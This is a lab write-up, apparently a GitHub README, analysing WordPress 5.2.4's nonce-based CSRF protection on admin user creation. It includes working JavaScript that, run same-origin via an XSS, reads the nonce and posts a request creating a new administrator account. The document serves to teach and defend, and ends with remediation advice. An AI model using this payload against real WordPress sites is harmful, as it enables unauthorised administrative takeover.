# ⚔️ WordPress Core Administrative User Creation — CSRF Exploitation

![Vuln](https://img.shields.io/badge/vuln-CSRF-red)
![Severity](https://img.shields.io/badge/severity-critical-critical)
![Platform](https://img.shields.io/badge/platform-Local%20Docker%20Lab-blue)
![Status](https://img.shields.io/badge/status-completed-success)

An analysis of WordPress core's CSRF protections during administrative user creation, run against a self-hosted **WordPress 5.2.4** instance in a local Docker lab — not a live or third-party site.

## Executive Summary

This assessment examines Cross-Site Request Forgery (CSRF) protections on WordPress's admin user-creation flow. WordPress core defends this action with a nonce (`wp_nonce_field()` + `check_admin_referer()`), and the analysis walks through two scenarios:

- ❌ **Cross-origin CSRF attack** → blocked by the Same-Origin Policy, as expected
- ✅ **Same-origin JavaScript execution** → nonce extraction succeeds, and a new administrator account is created

**Key insight:** the nonce itself isn't the real security boundary here — the browser's Same-Origin Policy is what actually prevents an unauthorized origin from ever reading the nonce value in the first place. Once that boundary is crossed (e.g. via XSS or another same-origin execution primitive), the nonce stops being a meaningful defense.

## Environment

| Component | Value |
|---|---|
| CMS | WordPress 5.2.4 |
| Server | Apache 2.4.38 |
| PHP | 7.3.11 |
| Deployment | Local Docker container |
| Endpoint | `/wp-admin/user-new.php` |

> Target throughout is `localhost` — a self-hosted local lab instance, not a production or third-party site.

## Source Code Analysis

**Nonce generation** — WordPress core creates the CSRF token with:

```php
wp_nonce_field('create-user', '_wpnonce_create-user');
```

Which renders as:

```html
<input name="_wpnonce_create-user" value="nonce_value">
```

| Property | Value |
|---|---|
| Action | `create-user` |
| Field | `_wpnonce_create-user` |
| Generation | `wp_create_nonce()` |
| Lifetime | ~12 hours |
| Scope | User + session |

## Server-Side Validation

The request is validated before account creation proceeds:

```php
check_admin_referer('create-user', '_wpnonce_create-user');
$user_id = edit_user();
```

```
POST request
     |
     v
Nonce validation
     |
     +---- Failed → 403 "Cheatin' uh?"
     |
     v
edit_user()
     |
     v
Administrator created
```

## Exploitation — Same-Origin Execution

A traditional cross-origin CSRF attack fails here, because the attacker's page can't read the nonce value from a different origin. But if an attacker can get JavaScript to execute *within* the target's own origin — via stored XSS, a vulnerable plugin, or any same-origin file inclusion — that protection collapses.

**Extract the nonce** (run inside the target origin):

```javascript
const nonce = document.querySelector('input[name="_wpnonce_create-user"]').value;
```

**Build the request:**

```javascript
const data = new URLSearchParams([
  ['action', 'createuser'],
  ['_wpnonce_create-user', nonce],
  ['_wp_http_referer', '/wp-admin/user-new.php'],
  ['user_login', 'admin2'],
  ['email', 'admin2@example.com'],
  ['pass1', '<TEST_PASSWORD>'],
  ['pass2', '<TEST_PASSWORD>'],
  ['role', 'administrator'],
  ['createuser', 'Add New User'],
]);
```

**Send it:**

```javascript
fetch('/wp-admin/user-new.php', {
  method: 'POST',
  body: data,
  credentials: 'include',
  headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
});
```

Result: a new administrator account (`admin2`) is created successfully.

## Automated Same-Origin Exploit

For a repeatable PoC, the exploit page can be dropped directly into the container's webroot and loaded same-origin:

```bash
docker cp exploit.html wp-docker-wordpress-1:/var/www/html/
```

Then visited at `http://localhost:8000/exploit.html`, triggering the full chain automatically:

```
GET user-new.php
        |
Extract nonce
        |
POST createuser request
        |
check_admin_referer()
        |
edit_user()
        |
Administrator account created
```

## Security Model

| Component | Cross-Origin | Same-Origin |
|---|---|---|
| Cookie access | Limited | Available |
| Nonce extraction | Blocked | Allowed |
| Request validation | Failed | Passed |
| Result | 403 | Account creation |

## Impact

Once an attacker achieves same-origin JavaScript execution, they can perform any authenticated administrative action the logged-in victim can — including creating a full administrator account.

```
XSS / Same-Origin Execution
          |
          v
Nonce Extraction
          |
          v
CSRF Request
          |
          v
Administrator Account Creation
```

**Impact: Critical** — full WordPress administrative compromise, contingent on an initial same-origin execution primitive.

## Remediation

Keep nonce protection in place — it's still the correct baseline defense:

```php
wp_nonce_field('action-name', 'nonce-field');
check_admin_referer('action-name', 'nonce-field');
```

Layer on additional hardening so a same-origin execution bug doesn't cascade into full compromise:

- Strict `SameSite` cookie attributes
- A tight Content Security Policy to reduce the odds of same-origin script execution in the first place
- Regular nonce/CSRF auditing across third-party plugins, which are the most common source of same-origin execution bugs in real WordPress deployments

## Final Conclusion

WordPress core correctly prevents traditional cross-origin CSRF through nonce validation combined with browser origin isolation:

```
Authentication Cookies
        +
Same-Origin Policy
        +
Nonce Validation
        =
CSRF Protection
```

The model only breaks down when a separate vulnerability grants an attacker same-origin code execution — which is why defense-in-depth (CSP, plugin auditing, SameSite cookies) matters even when nonce protection is implemented correctly.

## References

- [WordPress Developer Reference — wp_nonce_field()](https://developer.wordpress.org/reference/functions/wp_nonce_field/)
- [OWASP — Cross-Site Request Forgery Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

---

<p align="center">
  <sub>Write-up by <strong>Sepehr Abolhasan</strong> · Environment: self-hosted local Docker lab · For educational purposes only</sub>
</p>
